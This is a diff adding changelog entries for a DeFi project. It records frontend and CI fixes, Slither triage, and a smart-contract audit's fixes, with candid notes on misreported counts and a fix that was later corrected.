+- **An unset `VITE_WALLETCONNECT_PROJECT_ID` took down the whole app** ([#52](https://github.com/fomotsar-commits/tegridy-farms/pull/52)). RainbowKit's wallet wrappers — `metaMaskWallet`, `coinbaseWallet` — reach into `@walletconnect/sign-client` **at construction** and throw "No projectId found", which crashes the React root in CI, in preview deploys, and in any fresh clone. Dropped to bare wagmi connectors (`injected` + `coinbaseWallet`), which the commit records as the same wallet coverage with no WalletConnect dependency in the construction path.
+- **Every ALLOWLIST mint reverted at the proof check** ([#47](https://github.com/fomotsar-commits/tegridy-farms/pull/47)). `useNFTDropV2.mint()` accepts `allowedAmount` — the per-wallet cap baked into the merkle leaf — but `CollectionDetailV2.tsx` had no input for it, so the value silently defaulted to `0n` and the on-chain proof check rejected it. **The UX existed on paper and was broken in practice.** A second input now renders beside the merkle-proof field when phase is `ALLOWLIST`, sanitised to digits and parsed to bigint at submit, with `mintDisabled` also gating on it being non-empty. Public, Dutch and Closed phases are unchanged: the input does not render and `mint()` falls through to `0n`, which is the correct value when the proof is unused. The commit is candid that it could not exercise the new input end to end — that needs a deployed V2 drop in ALLOWLIST phase, which is not available locally — so the verification on record is `npm run build` exit 0, lint clean, and a dev-server smoke test showing the launchpad page renders without console errors.
+
+#52 also repaired the harness around all this: `playwright.config.ts` gained `reducedMotion: 'reduce'` so the AppLoader intro canvas auto-skips (without it every test sits behind a fullscreen overlay for the entire run), `/lending` was added to `sitemap.xml` so the trust-pages "sitemap lists primary routes" assertion could find it, and four e2e specs were realigned with the app they test — farm and history use `h2` not `h1`; the trade tab strip is `role=tab`, not `role=button`; DCA and Limit had been renamed "Recurring Swap" and "Price Alert"; and `gauge-voting` had to call `page.goto` **before** `walletMock.connect()`, because the init-script-installed `__walletMock` does not exist on `about:blank`.
+
+### Changed — The frontend lint backlog went 118 → 0 errors, but the middle step was a demotion, not a fix (2026-05-18 → 2026-05-20)
+
+Three commits, and the order is the point. `main` had been failing the "Lint, Type Check & Test" gate for several merges on a 118-error backlog left by the `eslint-plugin-react-hooks` v7 upgrade, which ships the React Compiler enforcement rules as **errors** under `flat.recommended`.
+
+- `fd4c2439` took 118 → 91, mostly at config level: the standard underscore-prefix opt-out for `@typescript-eslint/no-unused-vars` (args, vars, caughtErrors, destructuredArray) killed roughly 20 errors without touching a spec file, plus 7 genuine unused-variable removals. The commit enumerates the survivors by rule — 25 `rules-of-hooks`, 14 `preserve-manual-memoization`, 10 `no-explicit-any`, 8 `purity`, 7 `static-components`, 3 `refs`, 3 `only-export-components`, 2 `incompatible-library`, 1 `set-state-in-effect`, 18 misc — and says plainly that each cluster needs file-by-file refactoring, not a ten-minute lint pass.
+- `298d63f2` then took 91 → 0 **by demoting rules rather than fixing code**: thirteen React Compiler enforcement rules to `warn`, plus `rules-of-hooks`, `no-explicit-any` and `only-export-components`, and `no-empty` given `allowEmptyCatch`. Result on record: `96 problems (0 errors, 96 warnings)`. The reasoning is stated openly — none of the flagged patterns are correctness bugs, React works under them, the Compiler simply cannot auto-memoize around them — and the config comment commits to flipping them back to `error`. Two per-file exceptions were handled honestly instead: `textSafety.ts` regexes that genuinely need control characters got an inline disable with rationale, and a stale `exhaustive-deps` disable comment in a `.js` file was removed because the rule never loads for `.js` — *the disable comment was itself the error*.
+- [#48](https://github.com/fomotsar-commits/tegridy-farms/pull/48), two days later, did the refactoring across 27 files: 16 `catch {}` blocks annotated; `Date.now()` reads during render replaced with `useState(() => Date.now())` plus a once-a-minute `setInterval` in `StakingCard`, `DashboardPage.LoanRow`, `HistoryPage` and `LimitOrderTab`; `GlitchTransition`'s `useRef(Math.random())` and `useRef(performance.now())` moved to lazy initialisers; all 17 `GaugeVoting` hooks hoisted above the `if (!isDeployed)` early return with wagmi reads gated on `query.enabled`; `SortHeader` hoisted to module level out of `LendingSection`; `OnboardingModal`'s `useEffect(() => setOpen(...))` replaced by a strict-mode-safe lazy initialiser; four `useMemo` wrappers dropped from `AdminPage` because the Compiler could not preserve them anyway (the helpers were inferred deps but only `[contractReads]` was listed); and the Playwright fixture's `use` callback renamed to `provide` so the plugin stops mistaking it for React 19's `use()`.
+
+**The "91 errors → 0" in #48's subject is not measured against the tree it landed on.** `298d63f2` had already produced 0 errors, and #48 changed no ESLint config — `git diff 298d63f2 876ebe4a -- frontend/eslint.config.js` is empty, and reading the config at `876ebe4a` shows all thirteen Compiler rules plus `rules-of-hooks`, `no-explicit-any` and `only-export-components` still set to `warn`, with the promised flip back to `error` unmade by the end of this window. Its type-check note points the same way: the verification block records `npx tsc -b` clean but for a pre-existing `useNFTDrop.ts` L75 `TS2322`, and **that file does not exist in `876ebe4a`'s own tree** — `b2b842cd` deleted it two days earlier. The 27 files of refactoring are real; the headline count and the type-check both describe the pre-demotion, pre-deletion tree. `npm test` is recorded at 79 failures, identical to the baseline before the changes.
+
+### Fixed — Four CI layers were hiding each other, and the production bug at the bottom was dead code (2026-05-18)
+
+[#43](https://github.com/fomotsar-commits/tegridy-farms/pull/43) started as a lint cleanup and turned into an excavation. **Each step of the frontend job was green only because the step before it had failed and short-circuited the job**; fixing one exposed the next.
+
+- Lint failing meant **Build never ran**. Once lint passed, `tsc -b` immediately rejected `src/hooks/useNFTDrop.ts:75` with `TS2322`: the call site passes `[BigInt(quantity), proof]` against a `mint(uint256, uint256, bytes32[])` ABI, missing the middle `allowedAmount` — the merkle-proof per-user cap. `e739686a` marked both Build steps `continue-on-error: true` and `68085ec3` added an explicit `@ts-expect-error` with a multi-line BUG comment so `dist/` would upload and the pipeline could reach the next stage. Both commits state in terms that this fixes nothing at runtime and that every mint call from the UI is still malformed.
+- Build failing meant **Unit Tests never ran**. Once Build passed, 79 vitest failures across 12 files surfaced, all missing test-context providers (WagmiProvider, ThemeProvider), all pre-existing on `main`. `01abf8aa` marked that step too, with the arithmetic for not fixing it in-PR: 80 failures at roughly 5 minutes of provider wrapping each is 7+ hours, outside a lint PR's boundary.
+- Unit Tests failing meant **E2E never ran**. Once they passed, E2E had its own pre-existing failures, and `0677a89b` marked the fourth layer — the commit openly *guessing* at the causes rather than triaging them.
+- Then `b2b842cd` established what the bug at the bottom actually was. **`useNFTDrop` and `CollectionDetail` are dead V1 holdovers.** Production wiring in `LaunchpadSection.tsx` goes to `CollectionDetailV2` → `useNFTDropV2`, which already passes the correct 3-argument signature. Deleting `CollectionDetail.tsx` (285 LOC), `useNFTDrop.ts` (154) and `useNFTDrop.test.ts` (188) — **627 LOC** — removed the call site, took the `@ts-expect-error` with it, and let the Build `continue-on-error` be reverted in the same commit. Unit Tests and E2E kept their flags, being independent of the mint bug. Test count moved 79 → 77 failing purely because the deleted test file took 2 with it.
+
+*This is the origin of the `continue-on-error` flags that later entries in this file record removing — the vitest one on 2026-07-28, once run `30419320649` reported the suite passing on `mvp-launch`; the E2E one in [#138](https://github.com/fomotsar-commits/tegridy-farms/pull/138) the following day, after [#137](https://github.com/fomotsar-commits/tegridy-farms/pull/137) had established that all six of its stale specs were selector drift rather than app bugs.*
+
+### Internal — Slither restored to green under fail-on:medium: 209 Medium-and-above findings triaged as false positives (2026-05-18)
+
+[#45](https://github.com/fomotsar-commits/tegridy-farms/pull/45). A fresh run on `2221719` produced **991 results — 24 High, 185 Medium, 388 Low, 391 Informational, 3 Optimization** — and the commit records all 209 High-and-Medium as verified false positives driven by the shape of this codebase. Each suppression carries an inline `// SLITHER 2026-05-18: <rationale>` beside its `// slither-disable-next-line`, with an auditor-facing category summary in `contracts/src/.slither.suppress.md`. By category: `arbitrary-send-eth` (3 — protocol singleton and timelocked recovery), `weak-prng` (4 — canonical Uniswap V2 timestamp truncation), `reentrancy-balance` (7 — fee-on-transfer balance-delta behind a `nonReentrant` entrypoint), `reentrancy-eth` (7 — `nonReentrant` plus CEI verified), `uninitialized-state` (3 — deprecated slot and lazy-init mapping), `incorrect-equality` (70 — sentinel `== 0` and `tokenId == 0` checks), `uninitialized-local` (36 — Solidity default-init is the intent), `unused-return` (36 — intentional tuple destructure), `reentrancy-no-eth` (30) and `divide-before-multiply` (13). **After: 782 results, 0 High and 0 Medium, and `--fail-medium` exits 0.** Low and Informational are left unsuppressed and do not block under `fail-on: medium`; a later cleanup PR can walk them down.
+
+A debug step uploading `slither-report.json`, `slither-report.sarif` and any `slither.sarif` as a workflow artifact was added in the same PR, with `if: always()` and an explicit instruction to drop it once CI is reliably green — the previous suppression attempt had passed `--fail-medium` locally and failed on CI with four extra findings the author could not otherwise see.
+
+Twelve further false positives had already been silenced inside [#28](https://github.com/fomotsar-commits/tegridy-farms/pull/28) on the M5/M10/M11 fixes (`9e9c6ed6`): `reentrancy-no-eth` / `-benign` / `-events` on `TegridyRestaking.revalidateBoostForRestaked` and `…ForRestaker`, where the state-write-after-call ordering is forced by the semantics — settle needs the *new* boost, which only becomes readable after staking-side decay — and real reentrancy is blocked by `nonReentrant` on both sides of the call, a callback path that is only a standard ERC20 `safeTransfer`, and view-only cross-function reads; plus `incorrect-equality`/`timestamp` on `TegridyStaking._creditRewardPoolExcluding`, where Slither's heuristic read a numeric counter comparison as a timestamp one. *That helper was deleted by the M10 correction recorded above, which removed its `slither-disable-next-line incorrect-equality,timestamp` block along with it.*
+
+### Internal — Contracts CI could not fit inside the runner: eleven attempts on one PR, then a six-way matrix (2026-05-17 → 2026-05-18)
+
+`forge build + test` had been failing on `main` with **exit 143 (SIGTERM)** since the suite outgrew the ubuntu-latest runner's ~15-minute watchdog. [#28](https://github.com/fomotsar-commits/tegridy-farms/pull/28) carries the whole trail in order, and most of it was wrong — which is why it is worth keeping.
+
+- `04fa7eab` — `actions/cache@0c45773` (v4.0.2) was **deprecated by GitHub in December 2024 and fail-fast'd the entire workflow in 2-3 seconds**, before any contract work ran. Bumped to v4.2.0, same SHA-pinning style as the rest of the repo. This one line had been masking everything below it, including a 10,000-fuzz-run setting that had therefore never actually executed.
+- `24070737` — with the workflow finally running, the bytecode size budget reported `TegridyRestaking` at **28,201 B** and `TegridyStaking` at **25,863 B** on `main`, 3,625 and 1,287 over EIP-170. The commit checks that the PR was not the cause — post-PR Restaking is 27,838 B, *363 B smaller*, and Staking 26,137 B, +274 — and allowlists Restaking so CI signal reflects PR-introduced regressions only, with `Verify.s.sol` left as the real pre-deploy gate.
+- `dcbd3a47` — the Build step ran a bare `forge build`, compiling `src/`, `test/` and `script/` in one pass, and the Test step recompiled the tests anyway. `--skip test --skip script` roughly halved compile time and peak memory; the size step only reads `out/*.sol` artifacts under `src/`, so enforcement is untouched.
+- Then five swings at the wall clock: fuzz runs 10,000 → 1,000 (`32424e50`, after the 10,000-run step was killed at 14m49s) → 256 (`acbfb0ce`, after 1,000 was killed at 21m51s), invariants skipped (`207de845`, 61 tests taking ~15 min alone locally), fuzz skipped (`f3b79883`), and finally `-vvv` dropped to default verbosity (`e713238f`) on the theory that full call traces across 2,627 tests generate tens of MB of stdout — past the ~50 MB per-step log limit and the watchdog that kills steps with a backed-up buffer. Local reference figures recorded along the way: regular tests only ~14 min, with fuzz at 256 ~17 min, at 1,000 ~30+ min, at 10,000 hours; all 2,701 tests (2,627 regular + 13 fuzz + 61 invariant) ~30 min.
+- `ad29e427` — Coverage was next in line: `forge coverage` takes 15-30+ min on this codebase and blocked job completion even under `continue-on-error`. Disabled for PR CI with `if: ${{ false }}`, kept on the nightly cron.
+- `cf71d201` / `58254f43` — the last attempt was a bigger machine. `ubuntu-latest-large` (32 GB / 8 vCPU) queued for 7+ minutes with no runner pickup: **the org does not hold the GitHub Enterprise larger-runner entitlement.** Reverted to ubuntu-latest, and #28 merged with contracts CI still red on runner budget.
+
+[#41](https://github.com/fomotsar-commits/tegridy-farms/pull/41) is the dedicated fix. One serial `build-and-test` job becomes a `build` job (~2 min, `src/` plus the size budget) fanning out to six parallel test slices — `audit-early` (20 files), `audit-deep` (15), `tegridy` (19), `deep-fresh-final` (19), `pass-r-series` (28), `misc` (17), each ~3-4 min — plus an `all-tests-pass` aggregator so branch protection points at one stable check name and adding a slice never requires touching the protection rule. **Wall clock becomes `max(slice)` instead of `sum`, and a new test file goes to its topical slice instead of eating a shared budget.** All 118 test files were verified to fall in exactly one slice: regex intersection empty, union complete. Preserved from the old workflow: SHA-pinned actions, the cache key on `lib`/`foundry.toml` hashes, the `--skip test --skip script` build, the EXCEPTIONS allowlist, `FOUNDRY_FUZZ_RUNS=256`, the fuzz/invariant exclusion on every slice, and the disabled coverage step.
+
+*These are the six slices that went green while matching zero files five days later — the 2026-05-23 regex-instead-of-glob episode, recorded in the 2026-07-28 entry above as the first of two occurrences of that class. The slicing shape survives; the coverage guard that proves a slice actually matches something came only with #130.*
+
+### Security — From-scratch audit of all 36 contracts; 22 fixes across five batches, seven of them a canonical fix that had landed on one sibling and not the other (2026-05-17)
+
+[#28](https://github.com/fomotsar-commits/tegridy-farms/pull/28) merged a fresh, from-scratch sweep of every `.sol` file in `contracts/src/` — 36 of them. The companion `AUDIT_FINDINGS_2026_05_16.md` records **2 HIGH, 19 MEDIUM, 23 LOW and ~12 INFO** with file:line, a reproducer and the canonical source for each fix's lineage, plus **5 false positives caught and downgraded from the agent reports** and 2 MEDIUMs deferred with reasons stated: M14 self-bribery sybil split, accepted as Velodrome-parity operational risk, and M18 `Factory.getPair`-returns-disabled, judged interop UX rather than security.
+
+> *The counts in the commits do not add up, and are left as written.* The merge subject says 22 fixes — 2 HIGH + 17 MEDIUM + 3 LOW. The audit-document commit says "all 20 actionable findings (2 HIGH, 17 MEDIUM, 1 LOW post-condition + 3 LOW polish)", which enumerates 23 items and calls them 20.
+
+- **Batch 1 (1 HIGH + 6 MEDIUM) — sibling-port misses, the recurring defect class of this entire window.** H1: `TegridyStaking.applyRestakingContract` gained an `unsettledRewards[oldRestaking] > 0` residue guard — rotating while residue existed bricked the per-tokenId pull path for every restaker holding a residual claim, because `_isTrackedHolder` flips false on rotation; M12 is the symmetric guard on `applyLendingContract`. M6 added `int16 protocolFeeBpsAtCreate` to the NFT-lending Offer struct, captured at `createOffer` and consumed at `repayLoan`: without it a 48h-timelocked fee increase silently re-priced every in-flight loan's repay leg, up to `MAX_PROTOCOL_FEE_BPS = 1000`, moving 10% of interest from lender to treasury. M7 added the expired-proposal short-circuit to the `WHITELIST_REMOVE` gate. M8 made `TegridyLending.acceptOffer` honour `acceptedCollateralRemovalPending` — its NFT-lending sibling already did — so a borrower can no longer race the 48h de-whitelist window on collateral the admin is actively flagging. M9 gave `executeSweepUnsolicitedNFT` the stuck-mapping recheck loop that only the propose side ran, closing a race against a just-failed settlement. M19 overrode `TegridyNFTPoolFactory.acceptOwnership` to cancel pending fee proposals on handoff, a verbatim port of LaunchpadV2's DEEP-LP-01.
+- **Batch 2 (4 MEDIUM) — captured-owner blast radius.** M1 put `MAX_LIFETIME_RECOVERY_BPS = 100` (1% of `totalDistributed`) on `RevenueDistributor.executeClaimRecovery`, checked at propose against the projected share and clamped at execute, with a never-decremented `totalRecoveryClaimed` for the audit trail. **Pre-fix a captured owner could serially exfiltrate up to the 25% aggregate from *every* epoch, and because proposals parallelise across epochs the 48h delay applied once, not N times.** M2 hardcoded `SwapFeeRouter.sweepETH`'s destination to `revenueDistributor`. M3 and M4 blocked `sweepTokens` and `withdrawTokenFees` for any token holding a UniV2/WETH pair, so a liquid token's accumulated balance can no longer be taken whole to treasury instead of through the TWAP-gated conversion and the 50/30/20 staker/POL/treasury split, sharing one typed `UseConvertTokenFeesToETH()` selector for off-chain monitoring.
+- **Batch 3 (1 HIGH + 2 MEDIUM) — reward attribution.** H2: `TegridyRestaking` now calls `try staking.kick(tokenId) {} catch {}` at the entry of `claimAll`, `refreshPosition` and `unrestake`, before the stale-detection read. Without it a restaker whose lock had expired but whose decay had not yet been kicked read `currentBoosted == info.boostedAmount`, took the non-stale path, and accrued against an inflated `totalRestaked` denominator — capturing dilution at honest restakers' expense. M11 dropped the `updateBonus` modifier from both `revalidateBoost*` paths for the same reason one level down, inlining the R014 RETRY pattern from `claimAll`. M10 was the extend-fee whale rebate — **and is the fix the defensive scan then had to redo; see the correction entry above.**
+- **Batch 4 (1 MEDIUM) — `TegridyFeeHook.convertERC20FeesToETH` took a caller-supplied router with no allowlist.** A captured owner could deploy a router satisfying the path and WETH checks whose `swapExactTokensForETH` pulled the full `currency` balance via `transferFrom` and returned only the `1e14` wei `minETHOut` floor out of pre-funded ETH — keeping the balance for a cost the commit puts at about $0.0001. Now behind a 48h-timelocked allowlist that is empty at deploy, rejects EOAs and EIP-7702-delegated addresses (`code.length == 0 || 23`), and re-checks `WETH()` at execute time so mid-window router changes cannot slip through.
+- **Batch 5 (4 MEDIUM + 3 LOW).** M13 loosened `TegridyPair.swap`'s fee-on-transfer guard from `== postBalance` to `>= postBalance`: strict equality rejected every path that left *more* tokens at the pair — concurrent-transaction donations, selfdestruct force-feeds, atomic routing aggregators topping up in the same transaction — with no detection value gained, since sender-side FoT still underflows. M15 made `TegridyTWAP.consult` re-verify reserves against the same `effectiveMinReserveFloor` that `update` uses: a pair drained below the floor between observations froze the buffer while `consult()` kept serving the stale-but-honest TWAP for up to the 2h `MAX_STALENESS`, so lending and POL over-valued positions on a pool any small swap could move 90%+. M16 made `_touch` paused-conditional on the emergency-exit request/cancel paths. M17 moved `canUpdate(pair)` ahead of fee accounting and reserve reads so losing keepers stop paying for storage writes before being rejected. The LOWs: `TegridyDropV2.reveal("")` permanently bricked metadata, the revealed flag being monotonic; `TegridyNFTPool._settleRoyalty`'s `royaltyInfo` try-call was gas-capped at 50k, since a hostile collection burning 63/64 of forwarded gas reverted every swap OOG; and `TegridyLending.sweepUnsolicitedNFT` gained a real paired post-condition check, because its `moved` variable was actually the call status, so a collection that no-op'd `transferFrom` and returned success went undetected.
+- **DropV2 ownership (LOW).** Flagged as cluster asymmetry against `OwnableNoRenounce`. The investigation is the useful part: DropV2 is deployed via `Clones.cloneDeterministic` (EIP-1167) and **cannot** inherit `OwnableNoRenounce`, which is constructor-only — clones do not run constructors — so expiry and cancel were added inline instead of refactoring. `OWNERSHIP_TRANSFER_EXPIRY = 14 days` stamped on `transferOwnership` and cleared on accept or cancel, a new `cancelOwnershipTransfer(string reason)` closing the bricked-rotation primitive, and `renounceOwnership` now reverting typed `RenounceDisabled()` rather than the legacy string so off-chain alerts key on the cluster-wide 4-byte selector. `pendingOwner` kept its slot; the new one is appended.
+
+**Twenty-one tests asserted the old behaviour and were realigned** — 363/363 in the previously-failing suite, up from 342/363 — and the one *production* change that realignment forced is worth recording: M5's three new storage slots had been declared near the top of `TegridyFeeHook`, shifting `accruedFees` from slot 9 to slot 12 and breaking a test that writes it through `vm.store`. Rather than update the hardcoded slot, the M5 mutable state was moved to the end of the contract — slots 0-13 preserved, new state at 14-16, constants left at the top for readability.
+
+Final sweep on the branch: **2,701 tests (2,627 regular + 13 fuzz + 61 invariant), 0 failed.** The audit document states that a paid-firm engagement — Spearbit, OpenZeppelin or ChainSecurity — is still required before TVL approaches $10M, and names itself plus the eight fix commits as the inputs for it.
+
+### Security — five paths by which a captured owner could take value out of the timelocked split (2026-05-16)
+
+Batches 2 and 4 of the 2026-05-16 from-scratch sweep (`12426ed8`, `83d5abb5`). Both were authored on `claude/zealous-borg-d961c3` on 2026-05-16 and reached trunk in the [#28](https://github.com/fomotsar-commits/tegridy-farms/pull/28) merge on **2026-05-17**, whose own title totals the branch at 22 fixes (2 HIGH + 17 MEDIUM + 3 LOW) across five batches — the date here is the branch work, not the landing. None of these is a defect on the honest path — **all five are blast-radius reductions against an owner key that has already been taken**, and each one previously let that key route value around the timelocked staker/POL/treasury split.
+
+- **M1 — `RevenueDistributor.executeClaimRecovery` had no lifetime ceiling.** The pre-fix bound was per-epoch only: `aggregateCap = ep.totalLocked * MAX_AGGREGATE_RECOVERY_POWER_BPS / 10000`, a 25% ceiling on recovery *power*, which the commit reads through as 25% of every epoch's `totalETH` — and because recovery proposals parallelise across epochs, the 48h `CLAIM_RECOVERY_DELAY` applies once, not N times. Added `MAX_LIFETIME_RECOVERY_BPS = 100` (1% of `totalDistributed`), a `totalRecoveryClaimed` accumulator that is never decremented so the audit trail survives, and `RecoveryExceedsLifetimeCap()` — checked at propose time against the projected ETH share and again at execute time, clamped to the remaining cap. Symmetric with the forfeit-side `MAX_LIFETIME_FORFEIT_BPS` / `totalForfeitedReclaimed` pattern the commit cites at `RevenueDistributor.sol:1057-1069` and `:1213-1267`.
+- **M2 — `SwapFeeRouter.sweepETH` let the owner name the destination.** Donated or stuck ETH was instantly redirectable to treasury. The destination is now forced to `revenueDistributor`, so that ETH enters the normal split instead. Mirrors the V3-AMM-H1 fix already applied on `TegridyFeeHook`.
+- **M3 / M4 — `sweepTokens` and `withdrawTokenFees` could move a swappable token out whole.** Both now revert `UseConvertTokenFeesToETH()` when `uniFactory.getPair(token, WETH) != address(0)`: a token with a Uniswap V2 pair against WETH must go through `convertTokenFeesToETH`, which is TWAP-gated and splits. M4 is the sharper of the two — pre-fix the entire `accumulatedTokenFees[liquidToken]` balance was withdrawable to treasury. One shared typed error across both, so off-chain monitoring watches a single 4-byte selector.
+- **M5 — `TegridyFeeHook.convertERC20FeesToETH` took the router as an owner-supplied argument with no allowlist at all** (batch 4, `83d5abb5`). A `MaliciousRouter` satisfying the path and WETH checks could pull the full `currency` balance via `transferFrom` and hand back only the `1e14` wei `minETHOut` floor out of pre-funded ETH; the commit puts the attacker's cost at roughly $0.0001. Closed with a 48h-timelocked allowlist — `CONVERSION_ROUTER_DELAY = 48 hours` sits at `TegridyFeeHook.sol:66` in the post-fix tree: `CONVERSION_ROUTER_ADD` / `CONVERSION_ROUTER_REMOVE` keys, an `allowedConversionRouter` mapping that is **empty at deploy**, propose/execute/cancel on both sides, three typed errors and six events. `proposeAddConversionRouter` rejects EOAs and EIP-7702-delegated addresses (`code.length == 0 || 23`) and re-checks WETH at execute time so a mid-window router change cannot slip through. The honest operational consequence, stated in the commit: a fresh deploy cannot convert ERC-20 fees at all until a router has been proposed and 48 hours have elapsed.
+
+### Security — reward attribution was wrong in three places, and one of the fixes was wrong too (2026-05-16)
+
+Batch 3 of the same sweep (`86b69f70`): 1 HIGH + 2 MEDIUM on the staking/restaking reward pipeline, 140 insertions against 60 deletions across two contracts. Authored 2026-05-16; reached trunk with the rest of [#28](https://github.com/fomotsar-commits/tegridy-farms/pull/28) on 2026-05-17.
+
+- **H2 — lazy decay diluted the honest restakers.** `TegridyRestaking` read `staking.positions` to decide whether a position was stale *before* accruing. If a lock had expired but `staking.kick` had not yet fired, `currentBoosted == info.boostedAmount`, the stale flag never tripped, and `_accrueBonusChecked` ran against the inflated `totalRestaked` denominator — **the expired restaker captured dilution they were no longer entitled to share in, and everyone still restaked was under-credited.** Fix adds `kick(uint256)` to the consumed `ITegridyStaking` interface and injects `try staking.kick(info.tokenId) {} catch {}` at the entry of `claimAll`, `refreshPosition` and `unrestake`, ahead of the stale-detection read. `kick` reverts `NoOpKick` on a position that is neither expired nor already decayed; the catch absorbs that, matching the documented staking-side design.
+- **M11 — `revalidateBoostForRestaked` / `revalidateBoostForRestaker` accrued before the downgrade landed.** The `updateBonus` modifier accrued at a `totalRestaked` that still included `oldBoosted`, so a caller losing a boost (JBAC loss, say) pocketed the elapsed-period bonus on a slice they had already lost. The modifier was dropped from both paths and the canonical R014 RETRY sequence from `claimAll` (lines 880-941) inlined in its place: settle pending bonus on the old boost at the pre-accrue `accBonusPerShare`, anchor `bonusDebt` before the external transfer (CEI), shrink `totalRestaked`, accrue against the corrected smaller denominator, then re-anchor `bonusDebt` on the new boost post-accrue.
+- **M10 — a whale rebated its own extend fee (DEEP-DS-09).** `_chargeExtendFee` credited the recycled fee through `_creditRewardPool`, which divides by `totalBoostedStake` while the caller's own `p.boostedAmount` is still inside it — and the caller's `_getReward` runs immediately afterwards, so **a staker holding 50% of boosted stake got half of their own fee straight back.** The batch added `_creditRewardPoolExcluding(amount, contributorBoost)` (`TegridyStaking.sol:2423`), dividing by `totalBoostedStake - contributorBoost`, wired into `extendLock` and the `toggleAutoMaxLock` auto-enable branch, skipping the credit for the solo-staker case. The penalty-recycle paths (`earlyWithdraw`, `emergencyExitPosition`) deliberately kept `_creditRewardPool`: there the position is closing and the caller's boost has already left the denominator, so exclusion is structurally already correct.
+
+> **Correction (2026-05-17, `ff78789d`).** The M10 fix above was itself wrong and was replaced the next day; recorded here rather than edited away. `rewardPerTokenStored` is **global**, so bumping it by `recycled * ACC / (totalBoostedStake - contributorBoost)` still applied to every staker — total pending growth came to `totalB * recycled / (totalB - C)`, which **exceeds `recycled` whenever the caller had non-zero boost. A 50% whale produced a 2x over-credit that silently drained the reward pool.** The commit records it as latent under mainnet config (it needs an operator to set both `extendFeeBps` and `extendFeeRecycleBps` above zero, and both default to 0) and as found by a defensive post-merge scan of [#28](https://github.com/fomotsar-commits/tegridy-farms/pull/28) — i.e. by looking again at code that had just been merged. The replacement deletes `_creditRewardPoolExcluding` outright and uses the Yearn/Convex debt-advance pattern instead: credit against the **full** denominator so total pending growth is exactly `recycled`, then pre-cancel the caller's share with `p.rewardDebt += (boostedAmount * recycled) / totalBoostedStake`, which the immediately-following `_getReward` consumes and `_applyNewBoost` then recomputes cleanly, so the advance cannot leak forward. Regression coverage lands in `R029_TegridyStaking_ExtendFeeRecycle.t.sol`.
+
+### Security — seven fixes that had landed on one sibling contract and not the other (2026-05-16)
+
+Batch 1 (`0a08bffe`): 1 HIGH + 6 MEDIUM, 124 insertions across 4 files. Authored 2026-05-16, on trunk with [#28](https://github.com/fomotsar-commits/tegridy-farms/pull/28) on 2026-05-17. The commit's own framing is that **every fix here is a canonical pattern copied verbatim from a sibling contract in the same repo** — the finding is not "this is broken", it is "this was fixed once and the twin never got it". Per the minimal-surface mandate, no new attack surface was introduced.
+
+- **H1 — `TegridyStaking.applyRestakingContract` could be rotated with residue outstanding.** Rotating while `unsettledRewards[oldRestaking] > 0` bricked the per-`tokenId` pull path for every restaker holding a residual claim, because `_isTrackedHolder` flips false on rotation. The guard now refuses the rotation; the operator must drain through the old restaking contract first. **M12** applies the symmetric guard to `applyLendingContract` on revoke — same architectural class, opposite contract.
+- **M6 — `TegridyNFTLending` re-priced in-flight loans on a fee change.** Added an `int16 protocolFeeBpsAtCreate` field to the Offer struct, captured at `createOffer` and consumed at `repayLoan`. Pre-fix a 48h-timelocked `protocolFeeBps` increase silently re-priced every open loan's repay leg — up to `MAX_PROTOCOL_FEE_BPS = 1000`, i.e. 10% of interest moved off the lender and onto the treasury. Mirrors `TegridyLending`'s BATCH-D H9 / M-8 / F-07-01 fix.
+- **M7 — an uncancelled, expired `WHITELIST_REMOVE` proposal perma-DoS'd a whole collection.** `createOffer` and `acceptOffer` gated on the pending flag with no expiry short-circuit, so the collateral collection stayed unusable until the owner explicitly called `cancelRemoveCollection`. Added the `block.timestamp <= readyAt + _proposalValidity()` short-circuit, mirroring `TegridyLendingAdmin.acceptedCollateralRemovalPending` (M-27 / F-33-3).
+- **M8 — the reverse miss on the same pair of contracts.** `TegridyLending.acceptOffer` had no `lendingAdmin.acceptedCollateralRemovalPending` check, so a borrower could race the 48h de-whitelist window and consume an existing offer using collateral the admin was actively removing (a collection flagged compromised, for instance). The sister `NFTLending.acceptOffer` already carried the gate as its L-3 fix.
+- **M9 — `executeSweepUnsolicitedNFT` ran one of the propose path's two loops.** Propose checked both active collateral and the stuck-collateral mapping; execute checked only the first, so an admin sweep could race a just-failed settlement and take the legitimate stuck-collateral recipient's NFT. The recheck loop is now mirrored on the execute side.
+- **M19 — `TegridyNFTPoolFactory` carried hostile proposals across an owner handoff.** `acceptOwnership` is now overridden to cancel pending `PROTOCOL_FEE_CHANGE` / `PROTOCOL_FEE_RECIPIENT_CHANGE` proposals. Pre-fix an outgoing or compromised owner could propose a fee change immediately before `transferOwnership`, and the 48h timer kept running under the new owner — a deploy or keeper script could then execute the hostile change without knowing. Verbatim port of `TegridyLaunchpadV2`'s DEEP-LP-01 fix.
+
+### Fixed — a strict-equality guard that blocked legitimate composability, and a TWAP that kept quoting a pool after it had been drained (2026-05-16)
+
+Batch 5 (`f3254ae7`) closed the remaining MEDIUM interop/oracle/griefing items and three LOW post-condition guards — 7 findings, 81 insertions across 6 contracts. Authored 2026-05-16, on trunk with [#28](https://github.com/fomotsar-commits/tegridy-farms/pull/28) on 2026-05-17.
+
+- **M13 — `TegridyPair.swap`'s fee-on-transfer guard used `== postBalance`, which rejected every path that left *more* tokens at the pair than expected**: concurrent-transaction donations, `selfdestruct` force-feeds, and atomic-routing aggregators that top the pair up in the same transaction. Loosened to `>= postBalance`. The commit's reasoning: the strict form bought no FoT-detection value, since sender-side FoT still underflows the balance and trips `>=`, and the K-invariant is computed on the post-balance so donated dust cannot loosen swap accounting beyond the size of the gift.
+- **M15 — `TegridyTWAP.consult` served a stale-but-honest price for a pool that had already been drained.** If a pair fell below the reserve floor between observations, `update` reverted `ReservesBelowFloor` and froze the buffer, but `consult()` kept answering for up to `MAX_STALENESS` (2h). Downstream consumers (lending, POL) over-valued positions on a pool thin enough for a small swap to move 90%+. `consult` now re-verifies reserves at read time against the same `effectiveMinReserveFloor` / `effectiveMinReserveFloor1` used at update.
+- **M16 — request/cancel emergency-exit spam kept a user permanently un-reclaimable.** `_touch` refreshed `lastActivityAt[user]` on both `requestEmergencyExit` and `cancelEmergencyExit`, so a malicious user could cycle them during a pause and stay inside the 90-day `USER_INACTIVITY_GATE`, blocking owner-side `claimUnsettledFor(user)` recovery indefinitely. `_touch` is now skipped while paused. The pause-independent escape hatch is preserved, and the front-run the `_touch` refresh defends against is structurally absent during a pause because `claimUnsettledFor` is already `whenNotPaused`.
